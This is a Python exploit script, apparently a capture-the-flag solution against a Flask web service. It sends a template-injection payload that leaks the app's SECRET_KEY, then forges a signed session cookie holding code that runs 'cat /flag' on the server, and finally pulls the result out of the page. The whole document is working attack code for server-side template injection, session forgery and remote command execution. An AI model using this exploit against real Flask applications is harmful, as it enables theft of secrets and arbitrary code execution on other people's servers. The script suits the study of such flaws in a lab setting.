import requests
import re
from flask.sessions import SecureCookieSessionInterface

service = input('Service URL:')

r = requests.post(service, data={"code": "0/0#{{config}}"})
secret_key = re.search(
    r"SECRET_KEY&amp;#39;: &amp;#39;([0-9a-f]*)&amp;#39;", r.text
).group(1)


class FakeApp:
    secret_key = secret_key


fake_app = FakeApp()
session_interface = SecureCookieSessionInterface()
serializer = session_interface.get_signing_serializer(fake_app)
cookie = serializer.dumps(
    {"history": [{"code": '__import__("o"+ "s").popen("cat /flag").read()'}]}
)
print(cookie)

r = requests.get(service, cookies={"session": cookie})
flag = re.search(r"<div class=\"result\">(.+?{.+?})\n?</div>", r.text).group(1)

print(flag)